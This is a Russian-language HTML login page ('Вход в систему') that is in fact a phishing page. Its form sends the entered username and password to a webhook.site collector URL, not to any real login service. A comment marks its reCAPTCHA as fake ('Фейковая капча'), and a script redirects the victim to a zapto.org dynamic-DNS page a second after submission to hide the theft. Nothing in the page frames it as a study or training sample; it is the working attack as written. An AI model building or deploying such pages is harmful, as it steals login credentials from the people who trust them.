<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход в систему</title>
  <link rel="stylesheet" href="https://kazcyber.zapto.org/css/style.css">
</head>
<body>

<div class="auth-container">
  <h2>Войти в систему</h2>
  <form method="POST" action="https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291" id="loginForm">
    <input type="text" name="username" placeholder="Логин" required><br>
    <input type="password" name="password" placeholder="Пароль" required><br>

    <!-- Фейковая капча -->
    <div class="g-recaptcha" data-sitekey="6Ld_q0UrAAAAADc3t0ns6sob56ZAz5ikcUahqrv1"></div>

    <button type="submit">Войти</button>
  </form>
</div>

<script src="https://www.google.com/recaptcha/api.js" async defer></script>

<!-- Редирект после входа -->
<script>
  document.getElementById("loginForm").addEventListener("submit", function() {
    setTimeout(function() {
      window.location.href = "https://kazcyber.zapto.org/index.php";
    }, 1000);
  });
</script>

</body>
</html>
